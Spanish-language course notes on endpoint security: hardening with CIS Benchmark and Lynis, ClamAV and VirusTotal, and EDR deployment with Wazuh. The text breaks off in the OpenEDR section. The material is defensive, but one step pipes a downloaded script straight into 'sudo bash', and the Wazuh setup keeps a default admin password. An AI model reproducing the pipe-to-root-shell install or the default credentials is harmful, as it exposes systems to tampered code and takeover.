| **Inicio**         | **atrás 5**                                                                               | **Siguiente 7**                                                                    |
| ------------------ | ----------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./6_5_CiberSeguridad_de_las_Comunicaciones_y_redes_informaticas_Network_Security.md) | [⏩](./6_7_Operaciones_de_Seguridad_SOC_Monitorizacion_y_Repuesta_a_Incidentes.md) |

---

## **Índice**

| Temario                                                                                                                       |
| ----------------------------------------------------------------------------------------------------------------------------- |
| [531. Ciberseguridad de sistemas operativos](#531-ciberseguridad-de-sistemas-operativos)                                      |
| [532. Hardening del sistema operativo: CIS Benchmark](#532-hardening-del-sistema-operativo-cis-benchmark)                     |
| [533. Caso práctico: Evaluación automática de Hardening](#533-caso-práctico-evaluación-automática-de-hardening)               |
| [534. Anti-Virus (AV)](#534-anti-virus-av)                                                                                    |
| [535. Caso Práctico: Funcionamiento de un AV y Virustotal](#535-caso-práctico-funcionamiento-de-un-av-y-virustotal)           |
| [536. Endpoint Detection and Response (EDR)](#536-endpoint-detection-and-response-edr)                                        |
| [537. Caso práctico: Despliegue de un EDR profesional (OpenEDR)](#537-caso-práctico-despliegue-de-un-edr-profesional-openedr) |
| [538. Extended Detection and Response (XDR)](#538-extended-detection-and-response-xdr)                                        |
| [539. Host Intrusion Detection/Prevention System (HIDS/HIPS)](#539-host-intrusion-detectionprevention-system-hidships)        |
| [540. Caso práctico: Despliegue de un XDR profesional (Wazuh)](#540-caso-práctico-despliegue-de-un-xdr-profesional-wazuh)     |
| [541. Endpoint Privilege Management (EPM)](#541-endpoint-privilege-management-epm)                                            |
| [542. Monitorización del endpoint (beats, osquery, syslog...)](#542-monitorización-del-endpoint-beats-osquery-syslog)         |
| [543. Control de ejecución de aplicaciones (Applocker)](#543-control-de-ejecución-de-aplicaciones-applocker)                  |

---

# **Ciberseguridad y Hardening de Sistemas Operativos (Endpoint Security)**

## **531. Ciberseguridad de sistemas operativos**

### ✅ ¿Qué es la Ciberseguridad en Sistemas Operativos?

La **ciberseguridad en sistemas operativos (SO)** se refiere a las prácticas, herramientas y configuraciones que se utilizan para **proteger un sistema operativo** (como Windows, Linux o macOS) frente a **ataques, accesos no autorizados, malware y vulnerabilidades**.

---

### 🔐 ¿Qué protege un sistema operativo?

- **Archivos del sistema**: núcleo, controladores, configuraciones.
- **Datos de usuario**: documentos, contraseñas, fotos.
- **Recursos del sistema**: CPU, RAM, disco duro, red.
- **Servicios críticos**: actualizaciones, firewall, servicios de red (SSH, RDP, etc).

---

### 🛠️ ¿Cómo se implementa la ciberseguridad en un sistema operativo?

Te lo explico en **etapas** con ejemplos prácticos.

---

#### 1. **Mantener el sistema actualizado**

**Por qué:** Los atacantes aprovechan vulnerabilidades ya conocidas.

🔹 **Windows:**

```bash
Configuración > Actualización y seguridad > Buscar actualizaciones
```

🔹 **Linux (Ubuntu):**

```bash
sudo apt update && sudo apt upgrade -y
```

---

#### 2. **Crear usuarios con privilegios limitados**

**Por qué:** No todo usuario necesita acceso de administrador.

🔹 **Linux:**

```bash
sudo adduser juan
sudo usermod -aG sudo juan  # si quieres que tenga privilegios sudo
```

🔹 **Windows:**

```bash
Control Panel > Cuentas de usuario > Administrar cuentas > Crear nueva cuenta
```

---

#### 3. **Habilitar un cortafuegos (firewall)**

Evita accesos no autorizados desde la red.

🔹 **Linux (ufw - Uncomplicated Firewall):**

```bash
sudo apt install ufw
sudo ufw enable
sudo ufw allow ssh
sudo ufw status
```

🔹 **Windows Defender Firewall:**

Se activa desde Configuración > Firewall y protección de red.

---

#### 4. **Antivirus y Antimalware**

**Windows:** Windows Defender ya viene incluido. Se recomienda complementar con Malwarebytes.

**Linux:** Aunque es menos común, puedes usar `ClamAV`.

```bash
sudo apt install clamav
sudo freshclam
sudo clamscan -r /home
```

---

#### 5. **Auditoría de accesos y logs**

Saber quién hizo qué y cuándo es vital.

🔹 **Linux:**

```bash
cat /var/log/auth.log   # Ver intentos de login
```

🔹 **Windows:**

Visor de eventos > Registros de Windows > Seguridad

---

#### 6. **Cifrado de disco y archivos**

Protege datos en caso de pérdida o robo del equipo.

🔹 **Linux:**

Instala LUKS (si es desde cero) o usa `gpg` para archivos:

```bash
gpg -c archivo.txt
```

🔹 **Windows:**

Usa BitLocker (solo disponible en Windows Pro o Enterprise).

---

#### 7. **Desactivar servicios innecesarios**

Reduce la superficie de ataque.

🔹 **Linux:**

```bash
sudo systemctl stop apache2
sudo systemctl disable apache2
```

🔹 **Windows:**

```bash
services.msc
```

---

#### 8. **Políticas de contraseñas seguras**

Obligar a usar contraseñas fuertes, cambiarlas regularmente y bloquear tras intentos fallidos.

🔹 **Linux:** Usa `passwd`, `chage`, o configura `/etc/login.defs`.

🔹 **Windows:**

Configuración > Cuentas > Opciones de inicio de sesión > Requisitos de contraseña

---

#### 9. **Instalación de herramientas de ciberseguridad**

🔐 En Linux:

- **Fail2Ban**: bloquea IPs tras intentos fallidos
- **Lynis**: herramienta de auditoría
- **chkrootkit**: detección de rootkits

```bash
sudo apt install fail2ban
```

🔐 En Windows:

- **Sysinternals Suite** (de Microsoft)
- **Autoruns**, **Process Explorer**, **TCPView**

---

### 🧪 Ejemplo completo: Proteger un servidor Ubuntu expuesto a internet

Supón que tienes un servidor con Ubuntu 22.04 y lo vas a usar como web server con Nginx.

#### Paso 1: Actualizar sistema

```bash
sudo apt update && sudo apt upgrade -y
```

#### Paso 2: Crear un usuario seguro

```bash
sudo adduser gustavo
sudo usermod -aG sudo gustavo
```

#### Paso 3: Desactivar acceso root vía SSH

```bash
sudo nano /etc/ssh/sshd_config
```

Cambias:

```
PermitRootLogin no
```

Y reinicias:

```bash
sudo systemctl restart ssh
```

#### Paso 4: Configurar firewall

```bash
sudo apt install ufw
sudo ufw allow OpenSSH
sudo ufw allow 'Nginx Full'
sudo ufw enable
```

#### Paso 5: Instalar Fail2Ban

```bash
sudo apt install fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

#### Paso 6: Instalar y correr escáner de seguridad Lynis

```bash
sudo apt install lynis
sudo lynis audit system
```

#### Paso 7: Revisar logs de accesos

```bash
sudo tail -f /var/log/auth.log
```

#### Resultado:

Tu servidor:

- Tiene un usuario no-root con acceso restringido.
- Está actualizado.
- Está protegido con firewall.
- Bloquea intentos maliciosos de login.
- Tiene un reporte de seguridad con recomendaciones.

---

### 📌 Conclusión

La ciberseguridad en sistemas operativos **no es un solo paso**, sino un conjunto de prácticas **constantes y combinadas**. Implementarlas desde el inicio reduce riesgos como:

- Robo de datos
- Acceso no autorizado
- Instalación de malware
- Pérdida de integridad del sistema

---

[🔼](#índice)

---

## **532. Hardening del sistema operativo: CIS Benchmark**

### 🛡️ ¿Qué es el Hardening del Sistema Operativo?

**Hardening** significa **reforzar la seguridad** de un sistema operativo eliminando configuraciones innecesarias, cerrando puertos, desactivando servicios no usados, aplicando políticas de contraseñas, etc.

Su objetivo es **reducir la superficie de ataque** del sistema.

---

### 🏛️ ¿Qué es el CIS Benchmark?

El **CIS Benchmark** es un conjunto de recomendaciones de seguridad creado por el **Center for Internet Security (CIS)** para proteger:

- Sistemas operativos (Linux, Windows, macOS)
- Servidores (Apache, Nginx, IIS, etc)
- Bases de datos (MySQL, PostgreSQL, etc)
- Aplicaciones en la nube

#### 📘 Ejemplo de recomendación del CIS Benchmark para Linux:

> “Deshabilita el login directo del usuario root por SSH”

---

#### ✅ ¿Por qué usar el CIS Benchmark?

- Es un **estándar reconocido internacionalmente**.
- Te permite cumplir normativas como ISO 27001, NIST, PCI-DSS.
- Mejora la **resistencia ante ciberataques**.
- Puedes usar herramientas automáticas para auditar tu sistema.

---

### ⚙️ ¿Cómo se aplica el CIS Benchmark?

#### Existen dos formas:

1. **Manual:** Leyendo el documento y aplicando cada recomendación tú mismo.
2. **Automática:** Usando herramientas como:

   - **Lynis** (para Linux)
   - **CIS-CAT Pro** (herramienta oficial del CIS)
   - **OpenSCAP** (compatible con estándares de seguridad)

---

### 📦 Instalación y uso de CIS Benchmark con Lynis (Linux)

Aquí te lo explico paso a paso con ejemplos sencillos.

---

#### 🔧 Paso 1: Instalar Lynis (auditoría de seguridad CIS-like)

```bash
sudo apt update
sudo apt install lynis -y
```

---

#### 🧪 Paso 2: Ejecutar una auditoría básica

```bash
sudo lynis audit system
```

🔍 Esto hará un análisis del sistema y mostrará cosas como:

- Usuarios con login permitido
- Servicios innecesarios activos
- Permisos incorrectos en archivos del sistema
- Configuración de SSH débil

---

#### 📋 Paso 3: Ver recomendaciones

Después del escaneo, Lynis muestra recomendaciones como:

```
[+] Suggestion:
   - Disable SSH root login (CIS 5.2.8)
   - Set password expiration policy (CIS 5.4.1)
   - Enable automatic security updates
```

Cada línea indica qué puedes mejorar. Algunas están directamente alineadas con CIS Benchmarks.

---

### 📘 Ejemplo práctico completo: Aplicando el hardening a un servidor Ubuntu 22.04

#### 🎯 Objetivo: Aplicar 5 reglas del CIS Benchmark

---

#### 🔹 Recomendación 1: Deshabilitar login del usuario root

```bash
sudo nano /etc/ssh/sshd_config
```

Cambiar:

```
PermitRootLogin no
```

Guardar y reiniciar SSH:

```bash
sudo systemctl restart ssh
```

---

#### 🔹 Recomendación 2: Forzar contraseñas fuertes

Editar archivo:

```bash
sudo nano /etc/login.defs
```

Asegúrate de que tenga:

```
PASS_MIN_LEN 12
PASS_MAX_DAYS 90
PASS_MIN_DAYS 1
```

---

#### 🔹 Recomendación 3: Cerrar puertos innecesarios con UFW

```bash
sudo apt install ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw enable
```

---

#### 🔹 Recomendación 4: Desinstalar servicios no usados

```bash
sudo systemctl stop apache2
sudo systemctl disable apache2
sudo apt remove apache2 -y
```

---

#### 🔹 Recomendación 5: Habilitar actualizaciones automáticas

```bash
sudo apt install unattended-upgrades
sudo dpkg-reconfigure --priority=low unattended-upgrades
```

---

### 📄 Resultado

Tu sistema ahora cumple con varias recomendaciones del **CIS Benchmark**, incluyendo:

✅ SSH seguro

✅ Contraseñas fuertes

✅ Puertos controlados

✅ Servicios innecesarios eliminados

✅ Actualizaciones automáticas activadas

---

### 📦 ¿Y en Windows?

En Windows puedes usar:

- **CIS-CAT Lite (gratis):**

  [https://www.cisecurity.org/cis-cat-lite](https://www.cisecurity.org/cis-cat-lite)

- **Microsoft Security Compliance Toolkit**

  [https://learn.microsoft.com/en-us/windows/security/threat-protection/security-compliance-toolkit-10](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-compliance-toolkit-10)

También puedes importar **plantillas de seguridad** de CIS como `.inf` o `.pol` en el Editor de políticas de grupo.

---

### 🧠 Conclusión

El **hardening con CIS Benchmark** es una forma estandarizada y efectiva de proteger tu sistema operativo, tanto Linux como Windows.

🛡️ Reduce vulnerabilidades

🔧 Automatizable con herramientas

📈 Te prepara para cumplir auditorías de seguridad

---

[🔼](#índice)

---

## **533. Caso práctico: Evaluación automática de Hardening**

### 🛡️ ¿Qué es una Evaluación Automática de Hardening?

Es el **análisis automático del nivel de seguridad** (hardening) de un sistema operativo para detectar configuraciones inseguras, servicios innecesarios, usuarios peligrosos, puertos abiertos, entre otros.

🔍 El objetivo es **detectar qué tan bien protegido está tu sistema** y seguir recomendaciones como las del **CIS Benchmark** o **STIG**.

---

### 🧠 ¿Qué herramientas se usan para automatizar esa evaluación?

#### 🔧 En Linux:

1. **Lynis** – herramienta de auditoría de seguridad (muy usada)
2. **OpenSCAP** – basada en estándares de seguridad (CIS, DISA STIG)
3. **Tiger** – auditoría centrada en seguridad de UNIX
4. **Debian Security Audit** – para distros Debian-based

#### 🪟 En Windows:

1. **CIS-CAT Lite** – herramienta oficial del CIS Benchmark
2. **Microsoft Security Compliance Toolkit**
3. **SCAP Workbench** – también compatible con Windows

---

### 💡 ¿Qué revisa una evaluación automática?

- Acceso root o administrador
- Políticas de contraseñas
- Firewall y puertos abiertos
- Permisos de archivos y servicios
- Usuarios activos
- Auditoría de logs
- Servicios innecesarios activos
- Actualizaciones y parches

---

### ⚙️ ¿Cómo se instala y se hace la evaluación automática?

#### ✅ Usaremos **Lynis** (para Linux Ubuntu o Debian). Es rápido, confiable y fácil de usar.

---

### 🚀 Instalación paso a paso de Lynis en Linux

#### 🔹 Paso 1: Instalar Lynis

```bash
sudo apt update
sudo apt install lynis -y
```

---

#### 🔹 Paso 2: Ejecutar la auditoría completa del sistema

```bash
sudo lynis audit system
```

📋 Este comando hace todo lo siguiente:

- Revisa configuraciones del sistema
- Evalúa el estado de seguridad actual
- Muestra recomendaciones finales con severidad

---

#### 🔹 Paso 3: Revisar el reporte generado

Después del análisis, verás un resumen como este:

```bash
Hardening index : 68 [##################        ]
Suggestions    : 12
Warnings       : 3
```

Y recomendaciones como:

```
[+] Suggestion:
   - Disable SSH root login (CIS 5.2.8)
   - Set password expiration policy (CIS 5.4.1)
   - Enable automatic security updates
```

También puedes ver el log completo en:

```bash
/var/log/lynis.log
```

---

### ✅ CASO PRÁCTICO COMPLETO: Evaluación automática de hardening en Ubuntu 22.04

Imagina que eres responsable de un servidor Ubuntu 22.04 recién instalado. Quieres saber **qué tan seguro está y qué debes mejorar.**

---

#### 🔧 Paso 1: Instalar Lynis

```bash
sudo apt update
sudo apt install lynis -y
```

---

#### 🔍 Paso 2: Correr el análisis

```bash
sudo lynis audit system
```

---

#### 📋 Paso 3: Analizar los resultados

Supón que el reporte te devuelve:

```
Hardening index : 57
Warnings        : 5
Suggestions     : 14
```

Y entre las advertencias te dice:

| Nivel | Recomendación                                    | CIS Benchmark |
| ----- | ------------------------------------------------ | ------------- |
| 🔴    | PermitRootLogin está en yes                      | 5.2.8         |
| 🟡    | No hay política de expiración de contraseñas     | 5.4.1         |
| 🟡    | iptables no está configurado                     | 3.5.2         |
| 🟡    | No se están haciendo actualizaciones automáticas | 1.9           |

---

#### 🛠️ Paso 4: Aplicar mejoras recomendadas

##### 🔐 Deshabilitar el login SSH como root:

```bash
sudo nano /etc/ssh/sshd_config
```

Cambiar:

```
PermitRootLogin no
```

Reiniciar servicio:

```bash
sudo systemctl restart ssh
```

---

##### 🔐 Activar política de contraseñas:

```bash
sudo apt install libpam-pwquality
sudo nano /etc/security/pwquality.conf
```

Agregar:

```
minlen = 12
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
```

---

##### 🔐 Habilitar firewall:

```bash
sudo apt install ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw enable
```

---

##### 🔐 Activar actualizaciones automáticas:

```bash
sudo apt install unattended-upgrades
sudo dpkg-reconfigure --priority=low unattended-upgrades
```

---

#### 🧪 Paso 5: Re-auditar el sistema

Vuelve a ejecutar:

```bash
sudo lynis audit system
```

🔒 Ahora el Hardening Index puede subir, por ejemplo, de 57 a 80.

---

### 🧠 Conclusión

Una **evaluación automática de hardening** permite identificar **rápidamente puntos débiles** del sistema y aplicar correcciones alineadas a estándares como el **CIS Benchmark**.

#### Ventajas:

✅ Ahorra tiempo

✅ Te guía paso a paso

✅ Mejora el nivel de seguridad

✅ Es ideal para empresas y profesionales de ciberseguridad

---

[🔼](#índice)

---

## **534. Anti-Virus (AV)**

### 🛡️ ¿Qué es un Antivirus (AV)?

Un **Antivirus** es un software de ciberseguridad diseñado para:

- **Detectar**
- **Bloquear**
- **Eliminar**

… amenazas como:

- **Virus**
- **Troyanos**
- **Gusanos**
- **Ransomware**
- **Spyware**
- **Rootkits**
- **Keyloggers**

#### 📌 ¿Cómo funciona un antivirus?

1. **Escaneo** de archivos en tiempo real o por demanda.
2. Usa **firmas** (bases de datos de malware conocidos).
3. Algunos usan también **análisis heurístico** o **inteligencia artificial** para detectar malware desconocido.

---

### 🔍 ¿Dónde se usa un antivirus?

- 🪟 **Windows**: altamente recomendable (es el sistema más atacado).
- 🐧 **Linux**: en servidores, especialmente si se comparten archivos con Windows.
- 🍎 **macOS**: menos común, pero también puede usarse.

---

### 🛠️ ¿Cómo se instala un antivirus?

Vamos por partes:

---

### 🪟 En Windows

#### ✅ Ya viene preinstalado **Microsoft Defender Antivirus**

🔹 Para revisar si está activo:

```bash
Configuración > Actualización y seguridad > Seguridad de Windows > Protección contra virus y amenazas
```

---

#### 🧪 ¿Cómo se usa?

- **Análisis rápido**: escanea los archivos del sistema.
- **Análisis completo**: escanea todo el disco.
- **Análisis personalizado**: escanea una carpeta específica.

🔸 Puedes programar escaneos semanales y ver historial de amenazas.

---

#### 🧰 Otras opciones populares:

| Antivirus        | Gratis | Características destacadas               |
| ---------------- | ------ | ---------------------------------------- |
| Avast            | ✅     | Protección web y contra ransomware       |
| Bitdefender Free | ✅     | Ligero y rápido                          |
| Kaspersky Free   | ✅     | Protección en tiempo real                |
| Malwarebytes     | ✅     | Bueno para eliminar malware ya instalado |

🔹 Para instalar uno de estos, basta con descargar desde su sitio oficial y seguir el instalador gráfico.

---

### 🐧 En Linux (Ubuntu/Debian)

Aunque Linux no es tan atacado como Windows, **los servidores Linux sí necesitan antivirus**, especialmente si comparten archivos con clientes Windows.

#### ✅ Opción más usada: **ClamAV**

---

#### 🔧 Paso 1: Instalar ClamAV

```bash
sudo apt update
sudo apt install clamav clamav-daemon -y
```

---

#### 🔧 Paso 2: Actualizar la base de datos de firmas

```bash
sudo freshclam
```

---

#### 🔧 Paso 3: Escanear un archivo o carpeta

```bash
clamscan archivo.txt

# Para escanear una carpeta completa
clamscan -r /home/gustavo
```

🔹 Agrega `--remove=yes` para borrar automáticamente archivos infectados (¡con cuidado!).

---

#### 🔧 Paso 4: Escaneo automático (opcional)

Puedes usar `cron` para programar escaneos diarios:

```bash
crontab -e
```

Y agregar algo como:

```bash
0 2 * * * clamscan -r /home/gustavo > /home/gustavo/reportes/scan-$(date +\%F).log
```

---

### ✅ Caso práctico completo: Instalación y uso de antivirus en Ubuntu (ClamAV)

#### 🎯 Escenario:

Eres responsable de un servidor Ubuntu 22.04 donde los usuarios cargan archivos a través de un sitio web. Quieres escanear esos archivos automáticamente por seguridad.

---

#### 🔧 Paso 1: Instalar ClamAV

```bash
sudo apt update
sudo apt install clamav clamav-daemon -y
```

---

#### 🔧 Paso 2: Actualizar firmas de virus

```bash
sudo systemctl stop clamav-freshclam
sudo freshclam
sudo systemctl start clamav-freshclam
```

---

#### 🔧 Paso 3: Escanear una carpeta donde se cargan los archivos

Supongamos que los archivos se suben a `/var/www/uploads`

```bash
clamscan -r /var/www/uploads
```

---

#### 🔧 Paso 4: Automatizar el escaneo cada día

Editas el cron:

```bash
sudo crontab -e
```

Y agregas:

```bash
0 1 * * * clamscan -r /var/www/uploads --move=/home/gustavo/infectados
```

Esto hará un escaneo diario a la 1:00 AM y moverá los archivos infectados a una carpeta llamada `infectados`.

---

#### 📋 Resultado

✅ Antivirus instalado y actualizado

✅ Archivos subidos al servidor se escanean automáticamente

✅ Archivos peligrosos se aíslan

✅ Informe de seguridad diario disponible

---

### 🧠 Conclusión

Un **antivirus (AV)** es una de las **primeras barreras** de defensa de un sistema operativo. No basta con tenerlo instalado: debe estar **actualizado, activo y configurado para escanear regularmente**.

---

#### 🎁 Bonus: Comando para ver resumen rápido de virus en ClamAV

```bash
clamscan -r / | grep FOUND
```

Si no devuelve nada, ¡no hay virus detectado!

---

[🔼](#índice)

---

## **535. Caso Práctico: Funcionamiento de un AV y Virustotal**

### 🛡️ ¿Qué es y cómo funciona un Antivirus (AV)?

Un **Antivirus (AV)** es un programa de seguridad que **detecta, bloquea y elimina malware** de tu sistema operativo. Trabaja principalmente de estas tres formas:

#### 🔍 1. **Análisis por firmas**

- Compara los archivos con una **base de datos de malware conocido**.
- Como un policía con una lista de criminales buscados.

#### 🧠 2. **Análisis heurístico**

- Detecta **comportamientos sospechosos** aunque el virus no esté en la base de datos.

#### 🤖 3. **Detección basada en IA / aprendizaje automático**

- Algunos AV modernos usan algoritmos para detectar malware nuevo o mutado.

---

#### 📥 ¿Cómo se instala un AV?

Ya lo explicamos antes, pero para repasar:

##### 🪟 En Windows:

- Ya viene preinstalado **Microsoft Defender Antivirus**.
- También puedes usar **Malwarebytes**, **Avast**, **Bitdefender**, etc.

##### 🐧 En Linux:

- La opción más usada es **ClamAV** (instalable con `apt`).

---

### 🧪 ¿Qué es VirusTotal?

[🔗 https://www.virustotal.com](https://www.virustotal.com)

**VirusTotal** es un **servicio gratuito en línea** que permite analizar archivos y URLs con **más de 70 motores antivirus al mismo tiempo**.

#### 🔧 ¿Qué puedes hacer con VirusTotal?

- Subir un archivo y ver si es malicioso.
- Enviar una URL sospechosa y ver si contiene malware o phishing.
- Revisar el hash (SHA256) de un archivo para ver si alguien más lo ha subido.
- Usar su **API** para integrarlo en herramientas automáticas.

---

#### 🛠️ ¿Cómo se usa VirusTotal?

##### ✅ Opción 1: Desde la web

1. Ir a [https://www.virustotal.com](https://www.virustotal.com)
2. Hacer clic en “**Choose file**” o “**URL**”
3. Subir el archivo o pegar el enlace
4. Ver el resultado

##### ✅ Opción 2: Usando la **línea de comandos (CLI)** con su API

---

### 🔧 Cómo usar VirusTotal desde la terminal (avanzado)

#### 1. Crea una cuenta gratuita:

- Ve a [https://www.virustotal.com/gui/join-us](https://www.virustotal.com/gui/join-us)
- Consigue tu **API Key**

---

#### 2. Instala `vt-cli` (VirusTotal CLI)

##### En Linux:

```bash
curl -LO https://github.com/VirusTotal/vt-cli/releases/latest/download/vt-linux-amd64
chmod +x vt-linux-amd64
sudo mv vt-linux-amd64 /usr/local/bin/vt
```

##### En Windows (PowerShell):

Descarga desde:

[https://github.com/VirusTotal/vt-cli/releases](https://github.com/VirusTotal/vt-cli/releases)

---

#### 3. Configura la API

```bash
vt init
```

Pega tu clave API cuando te la pida.

---

#### 4. Escanea un archivo

```bash
vt scan file archivo_sospechoso.exe
```

#### 5. Ver el reporte

```bash
vt analysis archivo_id
```

---

### 🧪 Caso práctico completo: Analizar un archivo infectado con Antivirus + VirusTotal

#### 🎯 Escenario:

Tienes un archivo `actualizacion_sistema.exe` que descargaste por error. Quieres verificar si está infectado.

---

#### ✅ Paso 1: Escanear con Antivirus local

##### En Windows:

Haz clic derecho en el archivo → “Analizar con Microsoft Defender”

🔍 Resultado:

> El antivirus detecta que el archivo es sospechoso, pero no lo elimina porque no lo tiene en su base de datos aún.

---

#### ✅ Paso 2: Subir el archivo a VirusTotal Web

1. Ve a [https://www.virustotal.com/gui/home/upload](https://www.virustotal.com/gui/home/upload)
2. Sube `actualizacion_sistema.exe`
3. Esperas unos segundos…

#### 📋 Resultado:

VirusTotal muestra:

| Motor AV    | Resultado            |
| ----------- | -------------------- |
| Bitdefender | Gen\:Variant.Kazy    |
| Kaspersky   | Trojan.Win32.Generic |
| Avast       | FileRepMalware       |
| Microsoft   | Unknown              |

**💣 38 de 70 antivirus lo detectan como malware**

---

#### ✅ Paso 3: Acciones sugeridas

- **Eliminar inmediatamente el archivo**
- **Ejecutar un análisis completo del sistema**
- **Cambiar contraseñas si el archivo ya se ejecutó**
- **Hacer un respaldo si es necesario formatear**

---

#### 💡 Extra: VirusTotal para URL

Supón que te mandaron este enlace sospechoso:

```
http://descarga-gratis-segura123.ru/actualizacion.html
```

1. Entra a VirusTotal
2. Pega el enlace en la pestaña **URL**
3. Resultado:

> Categoría: Malware Hosting, Phishing
>
> Google Safebrowsing: Malicious
>
> Kaspersky: Blacklisted

---

### ✅ Conclusiones clave

| Antivirus Local (AV)             | VirusTotal                       |
| -------------------------------- | -------------------------------- |
| Escanea en tiempo real           | Escanea archivos con +70 motores |
| Protege tu equipo constantemente | Solo escanea lo que tú le subas  |
| Requiere instalación             | Es online (no necesita instalar) |
| Te protege automáticamente       | Útil para doble verificación     |

---

### 🧠 Recomendaciones finales

- Usa tu **antivirus local siempre activado y actualizado**.
- **No abras archivos desconocidos**, incluso si no los detecta tu antivirus.
- Usa **VirusTotal como segunda opinión** antes de abrir archivos dudosos.
- Para análisis en entornos empresariales o automatización, usa la **API de VirusTotal**.

---

[🔼](#índice)

---

## **536. Endpoint Detection and Response (EDR)**

### 🛡️ ¿Qué es EDR (Endpoint Detection and Response)?

**EDR** significa **“Detección y Respuesta en el Endpoint”**.
Un **endpoint** puede ser una computadora, laptop, servidor, etc.

Un **EDR es una herramienta de seguridad avanzada** que:

🔍 **Monitorea continuamente los endpoints**

🚨 **Detecta comportamientos maliciosos o anómalos**

🧠 Usa inteligencia para **responder a amenazas en tiempo real**

📝 Guarda registros para análisis forense posterior

---

### 🔑 Diferencias entre EDR y Antivirus

| Característica                | Antivirus tradicional | EDR                                             |
| ----------------------------- | --------------------- | ----------------------------------------------- |
| Detección basada en firmas    | ✅ Sí                 | ✅ Sí                                           |
| Análisis en tiempo real       | ✅ Parcialmente       | ✅ Avanzado (comportamiento, AI)                |
| Respuesta automática          | ❌ No                 | ✅ Sí (puede aislar el equipo, borrar procesos) |
| Visibilidad y forense         | ❌ No                 | ✅ Sí (registros de procesos, red, archivos)    |
| Capacidad de respuesta remota | ❌ No                 | ✅ Sí                                           |

👉 **El AV detecta y bloquea, el EDR detecta, responde y analiza.**

---

### 💡 Ejemplo fácil de entender

Imagina que un atacante ejecuta un script malicioso en una laptop de tu red:

- 🔹 El **Antivirus** detecta el archivo malicioso y lo bloquea (si lo conoce).
- 🔹 El **EDR**:

  - Detecta que un proceso (cmd.exe) intenta descargar algo extraño.
  - Lo detiene, **aísla el equipo de la red**.
  - Guarda los registros para análisis.
  - Notifica al equipo de ciberseguridad.

---

### 🔧 ¿Qué soluciones EDR existen?

| Producto                            | Sistema operativo   | Licencia                    | Observaciones                        |
| ----------------------------------- | ------------------- | --------------------------- | ------------------------------------ |
| **Microsoft Defender for Endpoint** | Windows/Linux/macOS | Pago (licencia empresarial) | Se integra con Azure y Microsoft 365 |
| **CrowdStrike Falcon**              | Windows/Linux/macOS | Pago (con prueba gratuita)  | Muy usado en empresas grandes        |
| **SentinelOne**                     | Windows/Linux/macOS | Pago                        | Automatiza respuesta                 |
| **Sophos Intercept X**              | Windows/macOS       | Pago                        | Integrado con AV                     |
| **Wazuh**                           | Windows/Linux/macOS | Gratuito y open source      | Ideal para aprendizaje y PyMEs       |

---

### ✅ ¿Cómo se instala un EDR?

Vamos a usar **Wazuh**, porque:

- Es gratuito y open source.
- Funciona en Windows, Linux y macOS.
- Tiene consola web, alertas, análisis de logs, detección de amenazas y más.

---

### 🧰 INSTALACIÓN DE EDR WAZUH EN LINUX (para pruebas)

#### 🐧 Paso 1: Usar una máquina con Ubuntu 22.04

#### 🐋 Paso 2: Instalar Docker y Docker Compose

```bash
sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl enable docker
```

---

#### 📦 Paso 3: Descargar el entorno de Wazuh

```bash
git clone https://github.com/wazuh/wazuh-docker.git
cd wazuh-docker
```

---

#### ⚙️ Paso 4: Levantar los servicios

```bash
sudo docker-compose up -d
```

Esto crea:

- Wazuh Manager (detección y análisis)
- Wazuh Dashboard (interfaz web)
- Elasticsearch (base de datos de eventos)
- Filebeat (recolección de logs)

🔑 Por defecto:
`https://localhost` (usuario: `admin`, contraseña: `SecretPassword`)

---

#### 🖥️ Paso 5: Instalar un agente en un endpoint (otro Linux o Windows)

##### En Ubuntu (endpoint):

```bash
curl -s https://packages.wazuh.com/4.x/bash/wazuh-agent-4.7.sh | sudo bash
```

🔧 Editar configuración del agente:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Agrega la IP del servidor Wazuh y reinicia el agente:

```bash
sudo systemctl restart wazuh-agent
```

---

### ✅ CASO PRÁCTICO COMPLETO: Funciona un EDR con Wazuh

#### 🎯 Escenario:

Eres un administrador de sistemas. Tienes 1 servidor Linux con Wazuh (EDR) y 1 laptop con Ubuntu como endpoint. Un usuario ejecuta un script sospechoso.

---

#### 🛠️ Paso 1: Wazuh detecta comportamiento inusual

El agente de Wazuh en la laptop detecta que un proceso:

- Está ejecutando un script
- Hace conexiones a direcciones IP inusuales
- Cambia archivos del sistema

---

#### 📡 Paso 2: Alerta generada automáticamente

La consola Wazuh muestra una alerta:

```
Rule: Suspicious shell activity
Level: 12 (high)
Location: agent_name->/var/log/auth.log
```

---

#### 🔐 Paso 3: El administrador responde

Desde la consola, puedes:

- Analizar el log detallado
- Aislar el endpoint (mediante firewall)
- Notificar al equipo de seguridad
- Crear una regla para bloquear ese comportamiento a futuro

---

### 📈 Resultado:

✅ El script no causó daño

✅ El endpoint fue contenido

✅ El incidente quedó documentado

✅ Puedes hacer análisis forense con los logs

---

### 📋 Recomendaciones finales

- Un antivirus **protege**. Un EDR **protege + detecta + responde + audita**.
- Ideal en entornos empresariales o equipos críticos.
- **VirusTotal + Antivirus + EDR = Defensa en profundidad**.
- Wazuh es una excelente opción para aprender y practicar gratis.

---

[🔼](#índice)

---

## **537. Caso práctico: Despliegue de un EDR profesional (OpenEDR)**

### 🛡️ ¿Qué es OpenEDR?

**OpenEDR** es una solución **profesional de código abierto** para **detección y respuesta en endpoints** (EDR). Fue desarrollada por **Comodo/SectorCyber**, y permite:

✅ Monitorear continuamente actividades en endpoints

✅ Detectar comportamientos sospechosos o ataques

✅ Analizar eventos de seguridad

✅ Automatizar respuestas ante incidentes

✅ Integrarse con herramientas SIEM o XDR

---

### 🔍 ¿Qué hace diferente a OpenEDR?

- Es **gratuito y open source**
- Ofrece **monitoreo de procesos, red, archivos y registros**
- Puede usarse en **Windows y Linux**
- Se puede integrar en redes empresariales o en pruebas locales

---

### 🧠 ¿Cómo funciona un EDR como OpenEDR?

Imagina que un atacante ejecuta un troyano en una PC:

1. OpenEDR detecta que un proceso nuevo está usando `powershell.exe` para conectarse a una IP externa.
2. El agente informa al servidor.
3. El analista de seguridad ve la alerta en la consola.
